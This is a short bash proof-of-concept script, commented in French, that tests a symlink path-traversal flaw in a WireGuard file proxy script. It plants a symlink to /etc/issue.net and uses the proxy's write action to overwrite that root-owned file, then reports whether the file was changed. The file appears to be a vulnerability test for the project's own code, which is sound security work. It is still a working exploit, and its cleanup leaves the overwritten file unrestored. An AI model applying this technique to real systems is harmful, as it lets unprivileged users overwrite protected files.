#!/bin/bash
# --- PoC : Vulnerability V17 (Symlink Path Traversal) ---
# Ce script démontre que wg-file-proxy.sh peut être contourné via des liens symboliques.

# 1. Préparation de l'environnement
CLIENT_DIR="/etc/wireguard/clients/poc_container/poc_client"
sudo mkdir -p "$CLIENT_DIR"
sudo chown 1001:1001 "$CLIENT_DIR"

# 2. Création du lien symbolique malveillant
# On utilise /etc/issue.net car c'est moins critique que /etc/issue mais ça nécessite root.
TARGET_FILE="/etc/issue.net"
SYMLINK_PATH="$CLIENT_DIR/pwned_link"
sudo ln -sf "$TARGET_FILE" "$SYMLINK_PATH"
sudo chown -h 1001:1001 "$SYMLINK_PATH"

echo "[INFO] Lien symbolique créé : $SYMLINK_PATH -> $TARGET_FILE"

# 3. Tentative d'écriture via le proxy (Action 'write')
echo "[INFO] Tentative d'écriture via wg-file-proxy.sh write..."
sudo ./core-vpn/scripts/wg-file-proxy.sh write "$SYMLINK_PATH" "PWNED BY VIBE-OS SYMLINK EXPLOIT"

# 4. Vérification
RESULT=$(cat "$TARGET_FILE")
echo "--- RÉSULTAT ($TARGET_FILE) ---"
echo "$RESULT"

if echo "$RESULT" | grep -q "PWNED BY VIBE-OS SYMLINK EXPLOIT"; then
    echo "[❌ VULNÉRABLE] Le fichier $TARGET_FILE a été écrasé via le lien symbolique."
else
    echo "[✅ SECURE] L'accès a été refusé ou le lien n'a pas été suivi."
fi

# Cleanup
# On restaure /etc/issue.net si on peut, ou on laisse l'utilisateur voir
